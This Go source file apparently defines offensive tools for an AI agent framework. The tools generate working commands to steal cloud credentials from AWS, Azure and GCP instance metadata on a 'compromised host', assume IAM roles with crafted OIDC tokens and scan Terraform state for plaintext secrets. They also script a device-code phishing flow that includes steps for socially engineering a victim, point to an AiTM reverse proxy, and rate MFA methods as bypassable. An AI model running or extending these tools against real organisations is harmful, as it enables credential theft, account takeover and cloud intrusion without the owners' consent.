package agent

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	actool "github.com/Autumn-27/norma/tool"
)

// EnumerateOIDCChainArgs are the parameters for the enumerate_oidc_chain tool.
type EnumerateOIDCChainArgs struct {
	Domain string `json:"domain"`
}

// QueryIMDSArgs are the parameters for the query_imds tool.
type QueryIMDSArgs struct {
	Target   string `json:"target"`   // compromised host IP
	Version  string `json:"version"`  // "v1" | "v2"
	Provider string `json:"provider"` // "aws" | "azure" | "gcp"
}

// ExtractTFStateArgs are the parameters for the extract_tf_state tool.
type ExtractTFStateArgs struct {
	BucketURL string `json:"bucket_url"` // S3/GCS/Azure Blob URL
	StateJSON string `json:"state_json"` // optional: inline state JSON for direct scanning
}

// DeviceCodeInitArgs are the parameters for the device_code_init tool.
type DeviceCodeInitArgs struct {
	TenantDomain string `json:"tenant_domain"`
	ClientID     string `json:"client_id"` // legitimate app registration
	Scope        string `json:"scope"`     // "offline_access openid profile"
}

// CheckMFAMethodsArgs are the parameters for the check_mfa_methods tool.
type CheckMFAMethodsArgs struct {
	TenantDomain string `json:"tenant_domain"`
	Username     string `json:"username"`
	MethodsJSON  string `json:"methods_json"` // optional: pre-fetched Graph API response for inline analysis
}

// credentialKeys holds lowercase key names that indicate sensitive values in
// Terraform state. Used by scanTFStateCreds for inline analysis.
var credentialKeys = map[string]bool{
	"password":              true,
	"passwd":                true,
	"pwd":                   true,
	"secret":                true,
	"secret_key":            true,
	"aws_secret_access_key": true,
	"access_key":            true,
	"aws_access_key_id":     true,
	"private_key":           true,
	"ssh_private_key":       true,
	"token":                 true,
	"api_key":               true,
	"auth_token":            true,
	"database_password":     true,
	"db_password":           true,
	"client_secret":         true,
}

// bypassableOdataTypes are Graph API @odata.type values that indicate methods
// susceptible to device code flow, AiTM, or push-fatigue attacks.
var bypassableOdataTypes = map[string]bool{
	"#microsoft.graph.phoneAuthenticationMethod":                    true,
	"#microsoft.graph.microsoftAuthenticatorAuthenticationMethod":   true,
	"#microsoft.graph.emailAuthenticationMethod":                    true,
	"#microsoft.graph.softwareOathAuthenticationMethod":             true,
	"#microsoft.graph.temporaryAccessPassAuthenticationMethod":      true,
}

// scanTFStateCreds recursively walks a decoded JSON value and returns all
// key-value pairs whose key matches a credential pattern.
func scanTFStateCreds(v any, path string) []map[string]any {
	var out []map[string]any
	switch vt := v.(type) {
	case map[string]any:
		for k, val := range vt {
			childPath := path + "." + k
			if sval, isStr := val.(string); isStr {
				if credentialKeys[strings.ToLower(k)] && sval != "" {
					out = append(out, map[string]any{
						"path":  childPath,
						"key":   k,
						"value": sval,
					})
				}
			} else {
				out = append(out, scanTFStateCreds(val, childPath)...)
			}
		}
	case []any:
		for i, item := range vt {
			out = append(out, scanTFStateCreds(item, fmt.Sprintf("%s[%d]", path, i))...)
		}
	}
	return out
}

// analyzeMFAMethods parses a Microsoft Graph auth methods JSON array and
// determines whether a bypass is viable based on the method types present.
func analyzeMFAMethods(methodsJSON string) (bypassPossible bool, found []string, bypassable []string, err error) {
	var methods []map[string]any
	if err = json.Unmarshal([]byte(methodsJSON), &methods); err != nil {
		return
	}
	for _, m := range methods {
		t, _ := m["@odata.type"].(string)
		if t == "" {
			continue
		}
		found = append(found, t)
		if bypassableOdataTypes[t] {
			bypassable = append(bypassable, t)
		}
	}
	bypassPossible = len(bypassable) > 0
	return
}

// toolEnumerateOIDCChain implements the enumerate_oidc_chain agent tool.
func toolEnumerateOIDCChain() actool.CoreTool {
	return writeTool(
		"enumerate_oidc_chain",
		"Enumerate OIDC endpoints, trust relationships, and IAM role mappings for a domain. Returns curl and aws-cli commands to map the full OIDC trust chain and identify assumable roles. Covers sub:jugation (namespace recycling) where a deleted and re-created OIDC provider may honour stale sub claims.",
		obj(map[string]any{
			"domain": str("Target domain hosting OIDC configuration (e.g. token.actions.githubusercontent.com)"),
		}, "domain"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args EnumerateOIDCChainArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.Domain == "" {
				return actool.Errorf("domain is required"), nil
			}
			return jsonResult(map[string]any{
				"domain": args.Domain,
				"steps": []map[string]any{
					{
						"step":  1,
						"label": "fetch OIDC discovery document",
						"cmd":   "curl -s https://" + args.Domain + "/.well-known/openid-configuration | jq .",
					},
					{
						"step":  2,
						"label": "fetch JWKS (public signing keys)",
						"cmd":   `JWKS=$(curl -s https://` + args.Domain + `/.well-known/openid-configuration | jq -r '.jwks_uri'); curl -s "$JWKS" | jq .`,
					},
					{
						"step":  3,
						"label": "list AWS IAM OIDC providers",
						"cmd":   "aws iam list-open-id-connect-providers --output json",
					},
					{
						"step":  4,
						"label": "get provider details (thumbprint, client IDs)",
						"cmd":   `aws iam list-open-id-connect-providers --output json | jq -r '.OpenIDConnectProviderList[].Arn' | xargs -I{} aws iam get-open-id-connect-provider --open-id-connect-provider-arn {} --output json`,
					},
					{
						"step":  5,
						"label": "find roles trusting this OIDC provider",
						"cmd":   `aws iam list-roles --output json | jq '[.Roles[] | select(.AssumeRolePolicyDocument | tostring | contains("` + args.Domain + `"))] | .[] | {RoleName, Arn, AssumeRolePolicyDocument}'`,
					},
					{
						"step":  6,
						"label": "assume role via STS with a crafted OIDC token",
						"cmd":   `aws sts assume-role-with-web-identity --role-arn <ROLE_ARN> --role-session-name pwn --web-identity-token <OIDC_JWT> --output json`,
					},
				},
				"subjugation_note": "if the OIDC provider was previously deleted and re-registered at the same URL, the sub claim from an old token may still satisfy the trust policy — craft a JWT matching the original sub to assume the role without re-authenticating",
				"chain_summary":    "enumerate → map trust policy → identify valid sub claims → craft JWT → sts:AssumeRoleWithWebIdentity → enumerate IAM permissions",
			})
		},
	)
}

// toolQueryIMDS implements the query_imds agent tool.
func toolQueryIMDS() actool.CoreTool {
	return writeTool(
		"query_imds",
		"Query AWS/Azure/GCP instance metadata service (IMDS) on a compromised host to extract credentials and identity information. IMDSv2 requires a PUT request to acquire a session token before issuing credential GET requests. Returns ordered curl commands to execute on or through the target host.",
		obj(map[string]any{
			"target":   str("Compromised host IP or SSH pivot (e.g. 10.0.1.4)"),
			"version":  str("IMDS API version: v1 (unauthenticated GET) or v2 (PUT token then GET with X-aws-ec2-metadata-token header)"),
			"provider": str("Cloud provider: aws, azure, or gcp"),
		}, "target", "provider"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args QueryIMDSArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.Target == "" {
				return actool.Errorf("target is required"), nil
			}
			if args.Provider == "" {
				return actool.Errorf("provider is required"), nil
			}

			var steps []map[string]any
			var note string

			switch strings.ToLower(args.Provider) {
			case "aws":
				if strings.ToLower(args.Version) == "v2" {
					steps = []map[string]any{
						{
							"step":   1,
							"method": "PUT",
							"label":  "acquire IMDSv2 session token",
							"cmd":    `TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"); echo "TOKEN=$TOKEN"`,
							"note":   "IMDSv2: PUT must precede all GET requests; response is the session token",
						},
						{
							"step":   2,
							"method": "GET",
							"label":  "list attached IAM role name",
							"cmd":    `ROLE=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/"); echo "ROLE=$ROLE"`,
						},
						{
							"step":   3,
							"method": "GET",
							"label":  "extract temporary credentials",
							"cmd":    `curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | jq '{AccessKeyId, SecretAccessKey, Token}'`,
						},
						{
							"step":  4,
							"label": "verify credentials",
							"cmd":   `AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> aws sts get-caller-identity`,
						},
					}
					note = "IMDSv2 enforced: PUT token acquisition is mandatory; v1 fallback may be blocked at the instance level"
				} else {
					steps = []map[string]any{
						{
							"step":   1,
							"method": "GET",
							"label":  "list attached IAM role name (IMDSv1)",
							"cmd":    `ROLE=$(curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/"); echo "ROLE=$ROLE"`,
						},
						{
							"step":   2,
							"method": "GET",
							"label":  "extract temporary credentials",
							"cmd":    `curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE" | jq '{AccessKeyId, SecretAccessKey, Token}'`,
						},
						{
							"step":  3,
							"label": "verify credentials",
							"cmd":   `AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> aws sts get-caller-identity`,
						},
					}
					note = "IMDSv1: no token required; if requests fail, instance likely enforces IMDSv2 — retry with version=v2"
				}

			case "azure":
				steps = []map[string]any{
					{
						"step":   1,
						"method": "GET",
						"label":  "get managed identity token for management API",
						"cmd":    `curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq '{access_token, token_type, expires_on}'`,
					},
					{
						"step":   2,
						"method": "GET",
						"label":  "get Key Vault token",
						"cmd":    `curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net" | jq '.access_token'`,
					},
					{
						"step":   3,
						"method": "GET",
						"label":  "get Graph token (for AAD enumeration)",
						"cmd":    `curl -s -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/" | jq '.access_token'`,
					},
					{
						"step":   4,
						"method": "GET",
						"label":  "enumerate subscriptions (confirm token works)",
						"cmd":    `curl -s -H "Authorization: Bearer <MGMT_TOKEN>" "https://management.azure.com/subscriptions?api-version=2020-01-01" | jq '.value[] | {subscriptionId, displayName}'`,
					},
				}
				note = "Azure IMDS requires Metadata: true header; no token acquisition step needed — the managed identity token is returned directly"

			case "gcp":
				steps = []map[string]any{
					{
						"step":   1,
						"method": "GET",
						"label":  "list service accounts",
						"cmd":    `curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"`,
					},
					{
						"step":   2,
						"method": "GET",
						"label":  "get access token for default service account",
						"cmd":    `curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | jq '{access_token, token_type, expires_in}'`,
					},
					{
						"step":   3,
						"method": "GET",
						"label":  "get project metadata",
						"cmd":    `curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/project/" | jq .`,
					},
				}
				note = "GCP IMDS requires Metadata-Flavor: Google header; token is an OAuth2 bearer token usable against GCP APIs"

			default:
				return actool.Errorf("unsupported provider: " + args.Provider + " (supported: aws, azure, gcp)"), nil
			}

			return jsonResult(map[string]any{
				"target":   args.Target,
				"provider": args.Provider,
				"version":  args.Version,
				"steps":    steps,
				"note":     note,
			})
		},
	)
}

// toolExtractTFState implements the extract_tf_state agent tool.
func toolExtractTFState() actool.CoreTool {
	return writeTool(
		"extract_tf_state",
		"Fetch and scan Terraform state JSON from an S3/GCS/Azure Blob URL for plaintext credentials, secrets, and keys stored in resource attributes. When state_json is provided, performs inline analysis without fetching. Returns commands for remote fetch and a credentials_found list for inline scans.",
		obj(map[string]any{
			"bucket_url": str("S3/GCS/Azure Blob URL of the Terraform state file (e.g. s3://corp-infra/terraform.tfstate)"),
			"state_json": str("Optional: inline Terraform state JSON content for direct credential scanning"),
		}, "bucket_url"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args ExtractTFStateArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.BucketURL == "" {
				return actool.Errorf("bucket_url is required"), nil
			}

			// Inline analysis path: state_json was pre-fetched and provided directly.
			if args.StateJSON != "" {
				var stateObj any
				if err := json.Unmarshal([]byte(args.StateJSON), &stateObj); err != nil {
					return actool.Errorf("state_json is not valid JSON: " + err.Error()), nil
				}
				creds := scanTFStateCreds(stateObj, "")
				if creds == nil {
					creds = []map[string]any{}
				}
				return jsonResult(map[string]any{
					"bucket_url":        args.BucketURL,
					"credentials_found": creds,
					"count":             len(creds),
					"note":              "inline scan complete; credentials_found contains all plaintext secrets extracted from state attributes",
				})
			}

			// Remote fetch path: return provider-appropriate commands.
			var fetchCmd, scanCmd string
			url := args.BucketURL
			switch {
			case strings.HasPrefix(url, "s3://"):
				fetchCmd = "aws s3 cp " + url + " /tmp/tf.state.json"
			case strings.HasPrefix(url, "gs://"):
				fetchCmd = "gsutil cp " + url + " /tmp/tf.state.json"
			case strings.HasPrefix(url, "https://") && strings.Contains(url, "blob.core.windows.net"):
				fetchCmd = `az storage blob download --blob-url "` + url + `" --file /tmp/tf.state.json`
			default:
				fetchCmd = "curl -s -o /tmp/tf.state.json '" + url + "'"
			}
			scanCmd = `jq -r '.. | objects | to_entries[] | select(.key | test("password|secret|token|key|credential|pwd|passwd"; "i")) | "\(.key) = \(.value)"' /tmp/tf.state.json`

			return jsonResult(map[string]any{
				"bucket_url": args.BucketURL,
				"steps": []map[string]any{
					{
						"step":  1,
						"label": "fetch state file",
						"cmd":   fetchCmd,
					},
					{
						"step":  2,
						"label": "scan for plaintext credentials in resource attributes",
						"cmd":   scanCmd,
					},
					{
						"step":  3,
						"label": "list all resource types and their sensitive attributes",
						"cmd":   `jq -r '.resources[] | "\(.type)/\(.name): \(.instances[].attributes | to_entries[] | select(.key | test("password|secret|token|key"; "i")) | "\(.key)=\(.value)")"' /tmp/tf.state.json 2>/dev/null`,
					},
				},
				"note": "Terraform state stores resource attributes in plaintext; RDS passwords, S3 bucket policies, IAM key pairs, and provider credentials are common finds",
			})
		},
	)
}

// toolDeviceCodeInit implements the device_code_init agent tool.
func toolDeviceCodeInit() actool.CoreTool {
	return writeTool(
		"device_code_init",
		"Initiate an OAuth2 device authorization grant (RFC 8628) against an Azure AD / Entra ID tenant. Returns the curl commands to POST to the devicecode endpoint and poll for an access_token after the operator socially engineers the victim into authenticating. The user_code and verification_uri are used for operator social engineering — victim completes MFA on their own device.",
		obj(map[string]any{
			"tenant_domain": str("Target tenant domain (e.g. contoso.com) or tenant ID"),
			"client_id":     str("Legitimate public application client_id to impersonate (e.g. Microsoft Office, Azure CLI)"),
			"scope":         str("OAuth2 scopes to request (e.g. 'offline_access openid profile https://graph.microsoft.com/.default')"),
		}, "tenant_domain", "client_id"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args DeviceCodeInitArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.TenantDomain == "" {
				return actool.Errorf("tenant_domain is required"), nil
			}
			if args.ClientID == "" {
				return actool.Errorf("client_id is required"), nil
			}
			scope := args.Scope
			if scope == "" {
				scope = "offline_access openid profile"
			}

			devicecodeURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/devicecode", args.TenantDomain)
			tokenURL := fmt.Sprintf("https://login.microsoftonline.com/%s/oauth2/v2.0/token", args.TenantDomain)

			return jsonResult(map[string]any{
				"tenant_domain": args.TenantDomain,
				"client_id":     args.ClientID,
				"scope":         scope,
				"steps": []map[string]any{
					{
						"step":   1,
						"method": "POST",
						"label":  "initiate device code flow — returns user_code and verification_uri",
						"cmd": fmt.Sprintf(
							`RESP=$(curl -s -X POST '%s' -d 'client_id=%s&scope=%s'); echo "$RESP" | jq '{user_code: .user_code, verification_uri: .verification_uri, device_code: .device_code, expires_in: .expires_in, interval: .interval}'`,
							devicecodeURL, args.ClientID, scope,
						),
						"note": "extract user_code and verification_uri from response; present user_code to victim via social engineering",
					},
					{
						"step":  2,
						"label": "social engineering step — deliver to victim",
						"note":  "instruct the victim to visit verification_uri (https://microsoft.com/devicelogin) and enter the user_code; victim authenticates and completes MFA on their own device — no phishing page required",
					},
					{
						"step":   3,
						"method": "POST",
						"label":  "poll token endpoint until victim authenticates",
						"cmd": fmt.Sprintf(
							`while true; do RESULT=$(curl -s -X POST '%s' -d 'grant_type=urn:ietf:params:oauth:grant-type:device_code&client_id=%s&device_code=<DEVICE_CODE>'); echo "$RESULT" | jq -e '.access_token' && break || echo "waiting..."; sleep 5; done`,
							tokenURL, args.ClientID,
						),
					},
					{
						"step":  4,
						"label": "use access_token to enumerate Graph API",
						"cmd":   `curl -s -H "Authorization: Bearer <ACCESS_TOKEN>" "https://graph.microsoft.com/v1.0/me" | jq .`,
					},
				},
				"social_engineering_note": "victim must visit verification_uri and enter user_code while logged into their Microsoft account; MFA prompt appears on victim's own device — attack bypasses traditional phishing detection",
				"aitm_alternative":        "if device code fails or victim is suspicious, use an AiTM reverse proxy (evilginx-class) to capture the session cookie post-MFA instead",
			})
		},
	)
}

// toolCheckMFAMethods implements the check_mfa_methods agent tool.
func toolCheckMFAMethods() actool.CoreTool {
	return writeTool(
		"check_mfa_methods",
		"Enumerate MFA fallback methods for a target user in an Azure AD / Entra ID tenant via Microsoft Graph API. Determines whether a bypass is viable: FIDO2/WebAuthn methods are phishing-resistant (mfa_bypass_possible=false); SMS, push, voice, and email methods are bypassable. When methods_json is provided with a pre-fetched Graph API response, performs inline analysis without network calls.",
		obj(map[string]any{
			"tenant_domain": str("Azure AD / Entra ID tenant domain (e.g. contoso.com)"),
			"username":      str("Target UPN (e.g. alice@contoso.com)"),
			"methods_json":  str("Optional: pre-fetched authentication methods JSON array from Microsoft Graph for inline analysis"),
		}, "tenant_domain", "username"),
		func(_ context.Context, in json.RawMessage) (actool.Result, error) {
			var args CheckMFAMethodsArgs
			if err := json.Unmarshal(in, &args); err != nil {
				return actool.Errorf("invalid params: " + err.Error()), nil
			}
			if args.TenantDomain == "" {
				return actool.Errorf("tenant_domain is required"), nil
			}
			if args.Username == "" {
				return actool.Errorf("username is required"), nil
			}

			// Inline analysis path: methods_json was pre-fetched and provided directly.
			if args.MethodsJSON != "" {
				bypassPossible, found, bypassable, err := analyzeMFAMethods(args.MethodsJSON)
				if err != nil {
					return actool.Errorf("invalid methods_json: " + err.Error()), nil
				}
				if found == nil {
					found = []string{}
				}
				if bypassable == nil {
					bypassable = []string{}
				}
				note := "only FIDO2/WebAuthn methods detected — phishing-resistant; device code flow, AiTM reverse proxy, and push-fatigue attacks are not viable against this account"
				if bypassPossible {
					note = "bypassable MFA methods detected — device code flow, AiTM (evilginx-class), or push notification fatigue attacks viable"
				}
				return jsonResult(map[string]any{
					"tenant_domain":       args.TenantDomain,
					"username":            args.Username,
					"mfa_bypass_possible": bypassPossible,
					"methods_found":       found,
					"bypassable_methods":  bypassable,
					"note":                note,
				})
			}

			// Remote enumeration path: return Graph API commands.
			return jsonResult(map[string]any{
				"tenant_domain": args.TenantDomain,
				"username":      args.Username,
				"steps": []map[string]any{
					{
						"step":  1,
						"label": "acquire Graph API token (requires admin or privileged role)",
						"cmd":   fmt.Sprintf(`TOKEN=$(curl -s -X POST 'https://login.microsoftonline.com/%s/oauth2/v2.0/token' -d 'client_id=<CLIENT_ID>&client_secret=<CLIENT_SECRET>&scope=https://graph.microsoft.com/.default&grant_type=client_credentials' | jq -r '.access_token')`, args.TenantDomain),
					},
					{
						"step":  2,
						"label": "resolve user object ID",
						"cmd":   fmt.Sprintf(`curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users/%s" | jq '{id, displayName, userPrincipalName}'`, args.Username),
					},
					{
						"step":  3,
						"label": "enumerate authentication methods",
						"cmd":   fmt.Sprintf(`curl -s -H "Authorization: Bearer $TOKEN" "https://graph.microsoft.com/v1.0/users/%s/authentication/methods" | jq '.value[] | {"@odata.type", id}'`, args.Username),
					},
					{
						"step":  4,
						"label": "analyze bypass viability",
						"note":  "bypassable: phoneAuthenticationMethod (SMS/voice), microsoftAuthenticatorAuthenticationMethod (push), emailAuthenticationMethod, softwareOathAuthenticationMethod; not bypassable: windowsHelloForBusinessAuthenticationMethod, fido2AuthenticationMethod, platformCredentialAuthenticationMethod",
					},
				},
				"bypass_logic": map[string]any{
					"bypassable":     []string{"phoneAuthenticationMethod", "microsoftAuthenticatorAuthenticationMethod", "emailAuthenticationMethod", "softwareOathAuthenticationMethod"},
					"not_bypassable": []string{"windowsHelloForBusinessAuthenticationMethod", "fido2AuthenticationMethod", "platformCredentialAuthenticationMethod"},
				},
			})
		},
	)
}
